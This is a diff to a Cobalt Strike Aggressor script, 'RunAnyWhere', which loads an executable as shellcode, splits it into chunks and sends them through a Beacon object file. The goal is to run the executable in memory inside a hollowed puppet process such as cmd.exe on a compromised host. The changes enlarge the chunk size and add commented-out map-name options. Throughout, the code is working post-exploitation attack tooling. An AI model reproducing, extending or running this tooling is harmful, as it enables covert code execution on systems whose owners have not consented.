@@ -32,12 +32,12 @@ item "内存运行"{
 # 2 upload complete
 # 9999 frp already in memory
 sub runAnyWhere{
-  local('$bid $shellcode_data $state $count $pename')
+  local('$bid $shellcode_data $state $count $pename $mapname')
   $state = 1;
   $count = 0;
   $bid = $3['bid'];
   $pename = $3['target'].$3['param'];
- 
+  #$mapname = $3['map'];
   btask($bid, "******* RunAnyWhere v0.1 *******");
 
   # read frp shellcode
@@ -57,12 +57,12 @@ sub runAnyWhere{
 
   $total_size = strlen($shellcode_data);
   $chunk_size = $total_size;
-  blog($bid,"[!] Total size: $total_size chunk_size:  $chunk_size");
+  blog($bid,"[!] Total size: $total_size chunk_size: $chunk_size Map_name: $mapname");
   # If frp has already been initialized, execute it directly
 
 
   # 900k chunks sent to leave room for protocol data too
-  $chunkSize = 1024 * 100 ;
+  $chunkSize = 1024 * 900 ;
 
   # must split shellcode
   $numChunks = $total_size / $chunkSize;
@@ -71,7 +71,7 @@ sub runAnyWhere{
 
   for($i = 0; $i < $numChunks; $i++){ 
         $chunk = substr($shellcode_data, $index, $index + $chunkSize);
-    	$args = bof_pack($bid, "ziiiib", $pename, $state, $total_size, $index , $chunkSize, $chunk) ;
+    	  $args = bof_pack($bid, "ziiiib",$pename , $state, $total_size, $index , $chunkSize, $chunk) ;
         $index += $chunkSize;
         $count = $count + 1;
         # when("beacon_output_alt", $this);
@@ -82,20 +82,21 @@ sub runAnyWhere{
   if($remainder > 0){
       $state = 2;
       $chunk = substr($shellcode_data, $numChunks * $chunkSize, ($numChunks * $chunkSize) + $remainder + 1);
-      $args = bof_pack($bid, "ziiiib", $pename, $state, $total_size, $index , $remainder, $chunk) ;
+      $args = bof_pack($bid, "ziiiib", $pename , $state, $total_size, $index , $remainder, $chunk) ;
       btask($1, "upload end block size: $remainder !");
       beacon_inline_execute($bid, $bofBytes, "go", $args);
       btask($1, "upload finish!");
     }
-  
 }
 
 
 sub runAnyWhereDialog{
-	$dialog = dialog("内存运行",%(bid => $1,target => "C:\\WINDOWS\\SYSTEM32\\CMD.EXE"), &runAnyWhere);
+  #$random = "random".rand(1000000);
+	$dialog = dialog("内存运行",%(bid => $1,target => "C:\\WINDOWS\\SYSTEM32\\CMD.EXE", map => $random), &runAnyWhere);
 	dialog_description($dialog, "非免杀用！注入后再操作！傀儡进程是64位只能起64位程序，32位数同理");
 	drow_text($dialog, "target",  "傀儡进程路径:");
 	drow_text($dialog, "param",  "运行参数(要加空格):");
+  #drow_text($dialog, "map",  "标识ID(不要用同一个ID):");
 	drow_file($dialog, "file", "要运行的EXE:");
 	dbutton_action($dialog, "GO!");
 	dialog_show($dialog);
